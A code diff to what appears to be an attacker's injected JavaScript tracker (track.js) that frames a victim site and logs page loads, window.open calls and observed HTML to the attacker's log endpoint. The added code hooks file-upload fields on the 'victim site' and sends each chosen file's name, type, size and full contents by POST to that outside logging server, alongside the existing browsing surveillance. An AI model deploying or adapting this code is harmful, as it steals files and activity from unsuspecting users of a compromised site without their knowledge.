@@ -20,8 +20,24 @@
  *       (defaults to current location without query params)
  * site - site id (optional) - used to enable logs from different sites simultaneously
  * observe - jQuery selector to look for in pages. If it's present, it's HTML content will be logged
+ * files - if set, will also try to capture files uploaded to victim site (requires XMLHttpRequest Level 2 support)
  */
 (function() {
+	function parseQuery (query) {
+		   var Params = {};
+		   if (!query) { return Params; } // return empty object
+		   var Pairs = query.split(/[;&]/);
+		   for (var i = 0; i < Pairs.length; i++) {
+		      var KeyVal = Pairs[i].split('=');
+		      if (!KeyVal || KeyVal.length != 2) {continue;}
+		      var key = unescape(KeyVal[0]);
+		      var val = unescape(KeyVal[1]);
+		      val = val.replace(/\+/g, ' ');
+		      Params[key] = val;
+		   }
+		   return Params;
+	}
+
 	var scripts = document.getElementsByTagName('script');
 	var myScript = scripts[ scripts.length - 1 ];
 	var scriptUrl = myScript.src.replace(/\?.*/, '');
@@ -31,24 +47,10 @@
 	var startUrl = params.start || location.href.replace(/\?.*/,'');
 	var logUrl = params.log || scriptUrl.replace(/\/track.js/, '/log.php');
 	var observeSelector = params.observe || null;
-
-	function parseQuery ( query ) {
-	   var Params = new Object ();
-	   if ( ! query ) return Params; // return empty object
-	   var Pairs = query.split(/[;&]/);
-	   for ( var i = 0; i < Pairs.length; i++ ) {
-	      var KeyVal = Pairs[i].split('=');
-	      if ( ! KeyVal || KeyVal.length != 2 ) continue;
-	      var key = unescape( KeyVal[0] );
-	      var val = unescape( KeyVal[1] );
-	      val = val.replace(/\+/g, ' ');
-	      Params[key] = val;
-	   }
-	   return Params;
-	};
+	var captureFiles = params.files || null;
 
 	function log(what) {
-		what["_"] = Math.random(); // avoid caching
+		what._ = Math.random(); // avoid caching
 		if (params.site) {
 			what.site = params.site;
 		}
@@ -63,7 +65,7 @@
 			i.src = logUrl + '?' + encodeURIComponent($.param(what));
 			$(i).load(function() {$(this).remove();}).appendTo('body');
 		}
-	};
+	}
 
 	var getPath = function(url) {
 		return url.match(/(\/.*)/)[1];
@@ -91,7 +93,7 @@
 				})
 		    .appendTo('body')
 			.load(function() {
-				var frame = this,height=null,location = null;
+				var height=null,location = null;
 
 				try {
 					location = this.contentDocument.location.href;
@@ -101,7 +103,7 @@
 					this.contentWindow.open = function(url) {
 						log({event: 'open', 'from': location, 'href': arguments[0], 'arguments': $.makeArray(arguments).slice(1)});
 						return openf.apply(this, $.makeArray(arguments));
-					}
+					};
 				} catch(e) {}
 
 				log({event: 'load', 'href': location, 'height': height});
@@ -133,8 +135,49 @@
 							 'content': clone.wrap('<div>').parent().html()
 						    });
 						clone.remove();
-					})
+					});
+				}
 
+				if (captureFiles && FileList) { // XMLHttpReqest Level 2 required
+					$('input[type=file]',this.contentDocument).live('change', function() {
+						if (this.files && this.files.length) {
+							var event, fd;
+							for (var i=0; i < this.files.length; i++) {
+								// first send the metadata
+								if (this.files[i].name === undefined) { // partial support only, abort
+									return;
+								}
+								event = {event: 'file_meta',
+										 from: location,
+										 input_name: this.name,
+										 name: this.files[i].name,
+										 type: this.files[i].type,
+										 size: this.files[i].size
+									   };
+								log(event);
+							}
+							if (typeof FormData !== 'undefined') {
+								for (i=0; i < this.files.length; i++) {
+									// send file contents
+									try {
+										fd = new FormData();
+										fd.append('event', 'file');
+										fd.append('from', 'location');
+										fd.append('input_name', this.name);
+										fd.append('name', this.files[i].name);
+										fd.append('type', this.files[i].type);
+										fd.append('size', this.files[i].size);
+										fd.append('contents', this.files[i]);
+										var xml = new XMLHttpRequest();
+										xml.open("POST", logUrl, true);
+										xml.send(fd);
+									} catch (e) {
+										console.log(e);
+									}
+								}
+							}
+						}
+					});
 				}
 			});
 
@@ -152,14 +195,12 @@
 
 	 //if the jQuery object isn't available
     if (typeof(jQuery) == 'undefined') {
-    		// load it
-    		var s = document.createElement('script');
-    		s.src = "http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js";
-    		document.body.appendChild(s);
-    		var interval = setInterval(pollJQuery, 200); // check every 200 ms
+        // load it
+        var s = document.createElement('script');
+        s.src = "http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js";
+        document.body.appendChild(s);
+        var interval = setInterval(pollJQuery, 200); // check every 200 ms
     } else {
-    	init(); // init immediately
+        init(); // init immediately
     }
-
-
 })();
